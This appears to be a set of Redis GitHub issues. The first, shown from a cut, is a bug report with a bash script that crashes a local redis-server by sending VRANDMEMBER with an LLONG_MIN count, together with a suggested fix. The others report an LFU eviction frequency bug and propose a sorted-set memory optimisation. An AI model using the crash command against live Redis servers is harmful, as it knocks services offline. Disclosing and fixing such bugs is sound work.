        local p=$((20000 + RANDOM % 30000))
        if ! (echo >"/dev/tcp/127.0.0.1/$p") >/dev/null 2>&1; then
            echo "$p"
            return 0
        fi
    done
    return 1
}

PORT="${PORT:-$(pick_port)}"
TMPDIR="$(mktemp -d /tmp/redis-vrandmember-llongmin.XXXXXX)"
LOG="$TMPDIR/redis.log"
PIDFILE="$TMPDIR/redis.pid"

cleanup() {
    if [[ -f "$PIDFILE" ]]; then
        "$CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1 || true
    fi
    rm -rf "$TMPDIR"
}
trap cleanup EXIT

echo "[+] Starting isolated redis-server on 127.0.0.1:$PORT"
"$SERVER" --port "$PORT" --bind 127.0.0.1 --save "" --appendonly no \
    --dir "$TMPDIR" --daemonize yes --pidfile "$PIDFILE" --logfile "$LOG"

for _ in $(seq 1 50); do
    if "$CLI" -p "$PORT" ping >/dev/null 2>&1; then
        break
    fi
    sleep 0.1
done

if ! "$CLI" -p "$PORT" ping >/dev/null 2>&1; then
    echo "[-] redis-server did not start" >&2
    tail -80 "$LOG" >&2 || true
    exit 1
fi

echo "[+] Creating a non-empty vector set"
"$CLI" -p "$PORT" VADD v VALUES 1 1 a >/dev/null

echo "[+] Triggering VRANDMEMBER with LLONG_MIN count"
set +e
TRIGGER_OUTPUT="$("$CLI" -p "$PORT" VRANDMEMBER v -9223372036854775808 2>&1)"
TRIGGER_RC=$?
set -e
echo "$TRIGGER_OUTPUT"
echo "[+] Trigger redis-cli exit code: $TRIGGER_RC"

sleep 0.3

set +e
PING_OUTPUT="$("$CLI" -p "$PORT" ping 2>&1)"
PING_RC=$?
set -e

if [[ "$PING_RC" -eq 0 ]]; then
    echo "[-] Server is still reachable; vulnerability did not reproduce" >&2
    echo "$PING_OUTPUT" >&2
    tail -120 "$LOG" >&2 || true
    exit 1
fi

if grep -q "networking.c:1208 'length >= 0' is not true" "$LOG"; then
    echo "[+] Reproduced: redis-server crashed on negative array length assertion"
    grep "networking.c:1208 'length >= 0' is not true" "$LOG"
    exit 0
fi

echo "[-] Server became unreachable, but expected assertion was not found" >&2
tail -160 "$LOG" >&2 || true
exit 1
```

Expected vulnerable behavior:

```text
Error: Server closed the connection
Could not connect to Redis at 127.0.0.1:<port>: Connection refused
networking.c:1208 'length >= 0' is not true
```

**Expected behavior**

should not crash

**Additional information**
 
Suggested Fix:

Reject `LLONG_MIN` in `VRANDMEMBER_RedisCommand()` before computing the absolute value, and ensure only non-negative lengths are passed to `RedisModule_ReplyWithArray()`. For example:

```c
if (count == LLONG_MIN) {
    return RedisModule_ReplyWithError(ctx, "ERR invalid COUNT");
}
```

A more robust fix would compute the absolute value using an unsigned type and also cap duplicate sampling counts to avoid large response-based resource exhaustion on the same path.

title: [BUG] Switching `maxmemory-policy` to LFU at runtime gets frequencies wrong for already existing keys, allowing to evict wrong keys
author: somechris
body:
**Describe the bug**

Setting some key and afterwards using `CONFIG SET` to switch to `allkeys-lfu` gave the key's frequency as `0` (too low) although the [documentation states](https://redis.io/docs/latest/commands/config-set/):

```
All the configuration parameters set using CONFIG SET are immediately
loaded by Redis and will take effect starting with the next command executed.
```

**To reproduce**

Using a fresh unconfigured instance (hence using `noeviction`):

```
> redis-cli
127.0.0.1:6379> SET foo value-foo
OK
127.0.0.1:6379> CONFIG SET maxmemory-policy allkeys-lfu
OK
127.0.0.1:6379> OBJECT FREQ foo
(integer) 0
```

That last `0` means that the key is unused and can get evicted, but should be `5` (`LFU_INIT_VAL`).

**Expected behavior**

The last number in the above example should be `5` (`LFU_INIT_VAL`) to flag a fresh object and allow some periods before it can get evicted.

See for example the [`| LFU_INIT_VAL` in `initObjectLRUOrLFU` (`object.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/object.c#L125) or the ["New keys don't start at zero" explanation in `evict.c`](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/evict.c#L251)

**Additional information**

In the snippet above, `SET foo value-foo` is run under the `noeviction` policy.

So it calls [`dbAddInternal` (`db.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/db.c#L416), which calls [`initObjectLRUOrLFU` (`object.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/object.c#L119), and takes the [`else` path](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/object.c#L126) to set `o->lru = LRU_CLOCK();` (time in seconds) So the object's `lru` is now "time in seconds"

After the switch to `allkeys-lfu`, [`OBJECT FREQ` (`object.c`) calls](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/object.c#L1765) [`LFUDecrAndReturn` (`evict.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/evict.c#L301). This function parses the object's `lru` field as if it was initialized for an LFU policy (16-bit time in minutes | freq), which it wasn't in this example. So this assumption does not hold and it mis-parses `ldt` to be (typically) far off from the current time and hence [takes `counter` to `0`](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/evict.c#L306), which signals a totally unused key that may be evicted.

Same for `GET`, which uses [`lookupKey` (`db.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/db.c#L279), which [calls](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/db.c#L319) [`updateLFU` (`db.c`)](https://github.com/redis/redis/blob/08b465e4f4891bef9f08d7049dd670627b86f7a4/src/db.c#L55), which updates the object's `lru` using `LFUDecrAndReturn` to a too low value.

Same for other commands.




Just to make the archives happy: The issue came up while hunting down a [flaky integration test](https://github.com/redis-rs/redis-rs/pull/2114#discussion_r3476975571) in [redis-rs](https://github.com/redis-rs/redis-rs)

title: 50% memory saving for Sorted Set
author: antirez
body:
Hi, before I enter the deeper QA / quality stage, I want to share with you my results and get some feedback. Recently I started to do something I wanted to do a long time ago: sorted sets are a nice data structure but extremely wasteful memory-wise, it is true that we have a compact representation for small sorted sets, but the value of sorted sets is often in very big or even huge sorted sets, for global scoring of some business logic.

So I implemented two fundamental changes: specialize the hash table for the entry -> metadata lookup, and modify the skiplist implementation to use macro nodes holding multiple elements in a single allocation.

## How the hash table works.

The trick used is to store the element string only in the skiplist. The hash table becomes buckets of N entries each that have a 8 bit checksum for quick refusal, and a pointer to the skiplist node of that entry.

## How the new skiplist works

On the skiplist side instead of having one allocation per entry, one node stores several elements, scores, strings, ... So of course this forces us to some scanning, but thanks to memory locality and having to scan less nodes, we are more the compensated.

## Give me the numbers!

* 1M integer-like members, ordered scores: 85.7 MB -> 34.4 MB  (-59.9%)
* After 100k random score updates: 85.7 MB -> 36.9 MB  (-56.9%)

For longer random members, the string bytes are a larger part of the total object, so the percentage saving is smaller but still large:

* 1M random alphanumeric members, 8..40 bytes, random scores: 111.3 MB -> 64.7 MB  (-41.8%)
* After 100k random score updates: 111.3 MB -> 67.6 MB  (-39.3%)

After the updates the new code will glue adjacent nodes, but some efficiency is lost anyway.
However this patch has a very nice property, it is a bit faster:

```
  1M random 8..40 byte members:
    ZADD:   3.03s -> 2.90s
    ZSCORE: 0.360s -> 0.359s
    ZRANGE: 0.0338s -> 0.0328s
    score updates: 0.437s -> 0.391s
```

So the question here is, how do we feel about extra complexity and a specialized hash table? I'm ok with it, because of AI and the kind of testing I'll be able to do. But I want the maintainers opinions as well before submitting a PR.
